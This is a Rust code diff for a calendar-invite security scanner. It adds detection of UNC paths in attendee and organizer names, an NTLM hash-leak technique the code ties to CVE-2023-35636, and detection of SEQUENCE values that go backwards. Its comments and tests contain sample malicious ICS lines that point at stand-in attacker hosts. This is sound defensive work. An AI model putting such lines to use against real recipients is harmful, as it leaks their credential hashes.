@@ -60,6 +60,25 @@ pub enum CalendarRisk {
         /// ATTACH プロパティ行の先頭部分
         snippet: String,
     },
+    /// ATTENDEE/ORGANIZER の CN フィールドに UNC パス (\\server\share) が含まれる。
+    ///
+    /// CVE-2023-35636 型攻撃: Outlook が CN を自動解決する際に UNC を参照し
+    /// NTLMv2 ハッシュが漏洩する。
+    /// 出典: https://codebook.machinarecord.com/threatreport/31520/
+    UncPathInAttendeeCn {
+        /// 問題の CN 値
+        cn: String,
+    },
+    /// SEQUENCE 番号が不正 (過去の値以下 = リプレイ/スプーフィングの可能性)。
+    ///
+    /// RFC 5545 §3.8.7.4: SEQUENCE は更新ごとに単調増加しなければならない。
+    /// 攻撃者が低い SEQUENCE で正規招待を上書きし会議の日時を変更する手法を防ぐ。
+    SequenceNotMonotonic {
+        /// 受信した SEQUENCE 値
+        received: u32,
+        /// 既知の最後の SEQUENCE 値
+        expected_min: u32,
+    },
 }
 
 /// カレンダー招待スキャン結果。
@@ -148,6 +167,17 @@ impl CalendarGuard {
             risks.push(risk);
         }
 
+        // 6. ATTENDEE / ORGANIZER CN の UNC パス検出 (CVE-2023-35636 型)
+        // CN="\\server\share" で NTLMv2 ハッシュ漏洩
+        for risk in detect_unc_in_attendee(ics_content) {
+            risks.push(risk);
+        }
+
+        // 7. SEQUENCE 単調性チェック (known_sequence=0 は初回受信を意味する)
+        if let Some(seq_risk) = check_sequence_monotonicity(ics_content, 0) {
+            risks.push(seq_risk);
+        }
+
         let risk_level = Self::calculate_level(&risks);
         CalendarScan { risks, risk_level }
     }
@@ -223,8 +253,10 @@ impl CalendarGuard {
 
         let has_suspicious_url = risks.iter().any(|r| matches!(r, CalendarRisk::SuspiciousUrl { .. }));
         let has_suspicious_meeting = risks.iter().any(|r| matches!(r, CalendarRisk::SuspiciousMeetingLink { .. }));
+        let has_unc = risks.iter().any(|r| matches!(r, CalendarRisk::UncPathInAttendeeCn { .. }));
+        let has_binary = risks.iter().any(|r| matches!(r, CalendarRisk::EmbeddedBinaryAttachment { .. }));
 
-        if has_suspicious_url || has_suspicious_meeting {
+        if has_suspicious_url || has_suspicious_meeting || has_unc || has_binary {
             CalendarRiskLevel::Danger
         } else {
             CalendarRiskLevel::Caution
@@ -239,6 +271,75 @@ impl Default for CalendarGuard {
 // ============================================================================
 // ICS パーサーユーティリティ
 // ============================================================================
+
+/// ATTENDEE / ORGANIZER の CN フィールドに UNC パスが含まれるか検出する (CVE-2023-35636 型)。
+///
+/// 攻撃例:
+/// ```ics
+/// ATTENDEE;CN="\\\\attacker.com\\share":mailto:victim@example.com
+/// ```
+/// Outlook 等が CN を UI 表示のために解決しようとすると UNC を参照し、
+/// NTLMv2 ハッシュが攻撃者サーバーに漏洩する。
+/// 出典: https://codebook.machinarecord.com/threatreport/31520/ (2024)
+fn detect_unc_in_attendee(content: &str) -> Vec<CalendarRisk> {
+    let mut risks = Vec::new();
+    for line in content.lines() {
+        let upper = line.to_uppercase();
+        if !upper.starts_with("ATTENDEE") && !upper.starts_with("ORGANIZER") {
+            continue;
+        }
+        // CN="..." または CN=... を抽出
+        let cn_value = extract_cn_value(line);
+        if let Some(cn) = cn_value {
+            // UNC パス: \ \ で始まる (バックスラッシュ 2 連続)
+            if cn.contains("\\\\") || cn.contains("//") {
+                risks.push(CalendarRisk::UncPathInAttendeeCn { cn });
+            }
+        }
+    }
+    risks
+}
+
+/// CN パラメータ値を抽出する。`CN="value"` または `CN=value` 形式に対応。
+fn extract_cn_value(line: &str) -> Option<String> {
+    let upper = line.to_uppercase();
+    let cn_pos = upper.find(";CN=")?;
+    let rest = &line[cn_pos + 4..]; // skip ";CN="
+    if let Some(rest_inner) = rest.strip_prefix('"') {
+        // CN="quoted value"
+        let end = rest_inner.find('"')?;
+        Some(rest_inner[..end].to_string())
+    } else {
+        // CN=unquoted — 次の ; か : で終端
+        let end = rest.find([';', ':']).unwrap_or(rest.len());
+        Some(rest[..end].to_string())
+    }
+}
+
+/// SEQUENCE フィールドが単調増加しているか確認する (RFC 5545 §3.8.7.4)。
+///
+/// `known_sequence` は直前に処理した SEQUENCE 値。初回受信時は `0`。
+/// SEQUENCE < `known_sequence` の場合はリプレイ/スプーフィングの可能性。
+fn check_sequence_monotonicity(content: &str, known_sequence: u32) -> Option<CalendarRisk> {
+    // SEQUENCE: の値を取得
+    for line in content.lines() {
+        let upper = line.to_uppercase();
+        if upper.starts_with("SEQUENCE:") {
+            let val_str = line[9..].trim();
+            if let Ok(seq) = val_str.parse::<u32>() {
+                // seq == 0 は初回作成なので known_sequence == 0 のとき正常
+                if known_sequence > 0 && seq < known_sequence {
+                    return Some(CalendarRisk::SequenceNotMonotonic {
+                        received: seq,
+                        expected_min: known_sequence,
+                    });
+                }
+            }
+            break;
+        }
+    }
+    None
+}
 
 /// ATTACH プロパティに base64 バイナリが埋め込まれているかを検出する。
 ///
@@ -521,6 +622,80 @@ END:VCALENDAR"#;
             !scan.risks.iter().any(|r| matches!(r, CalendarRisk::EmbeddedBinaryAttachment { .. })),
             "URL 形式の ATTACH はバイナリとして検出しない"
         );
+    }
+
+    // ──────────────────────────────────────────────────────────────────
+    // ATTENDEE CN UNC パス検出 (CVE-2023-35636 型)
+    // ──────────────────────────────────────────────────────────────────
+
+    #[test]
+    fn detects_unc_path_in_attendee_cn() {
+        let g = guard();
+        let ics = "BEGIN:VCALENDAR\n\
+                   BEGIN:VEVENT\n\
+                   ATTENDEE;CN=\"\\\\attacker.com\\share\":mailto:victim@example.com\n\
+                   END:VEVENT\n\
+                   END:VCALENDAR";
+        let scan = g.analyze(ics);
+        assert!(
+            scan.risks.iter().any(|r| matches!(r, CalendarRisk::UncPathInAttendeeCn { .. })),
+            "ATTENDEE CN の UNC パスが検出されるべき: {:?}", scan.risks
+        );
+        assert_eq!(scan.risk_level, CalendarRiskLevel::Danger);
+    }
+
+    #[test]
+    fn detects_unc_path_in_organizer_cn() {
+        let g = guard();
+        let ics = "BEGIN:VCALENDAR\n\
+                   ORGANIZER;CN=\"\\\\evil.server\\ntlm\":mailto:fake@org.com\n\
+                   END:VCALENDAR";
+        let scan = g.analyze(ics);
+        assert!(
+            scan.risks.iter().any(|r| matches!(r, CalendarRisk::UncPathInAttendeeCn { .. })),
+            "ORGANIZER CN の UNC パスが検出されるべき"
+        );
+    }
+
+    #[test]
+    fn normal_attendee_cn_passes() {
+        let g = guard();
+        let ics = "BEGIN:VCALENDAR\n\
+                   ATTENDEE;CN=\"Alice Smith\":mailto:alice@company.co.jp\n\
+                   END:VCALENDAR";
+        let scan = g.analyze(ics);
+        assert!(!scan.risks.iter().any(|r| matches!(r, CalendarRisk::UncPathInAttendeeCn { .. })),
+            "通常の CN は問題なし: {:?}", scan.risks);
+    }
+
+    // ──────────────────────────────────────────────────────────────────
+    // SEQUENCE 単調性チェック
+    // ──────────────────────────────────────────────────────────────────
+
+    #[test]
+    fn sequence_monotonicity_violation_detected() {
+        // known_sequence=5 に対して SEQUENCE:2 は後退 → リプレイ/スプーフィング
+        let content = "BEGIN:VCALENDAR\nSEQUENCE:2\nEND:VCALENDAR";
+        let risk = check_sequence_monotonicity(content, 5);
+        assert!(
+            matches!(risk, Some(CalendarRisk::SequenceNotMonotonic { received: 2, expected_min: 5 })),
+            "SEQUENCE 後退はリスクとして検出されるべき: {risk:?}"
+        );
+    }
+
+    #[test]
+    fn sequence_monotonic_ok() {
+        let content = "BEGIN:VCALENDAR\nSEQUENCE:6\nEND:VCALENDAR";
+        let risk = check_sequence_monotonicity(content, 5);
+        assert!(risk.is_none(), "SEQUENCE 前進は正常: {risk:?}");
+    }
+
+    #[test]
+    fn sequence_first_receive_not_flagged() {
+        // known_sequence=0 の場合 SEQUENCE:0 は初回作成として正常
+        let content = "BEGIN:VCALENDAR\nSEQUENCE:0\nEND:VCALENDAR";
+        let risk = check_sequence_monotonicity(content, 0);
+        assert!(risk.is_none(), "初回受信は正常");
     }
 
     #[test]
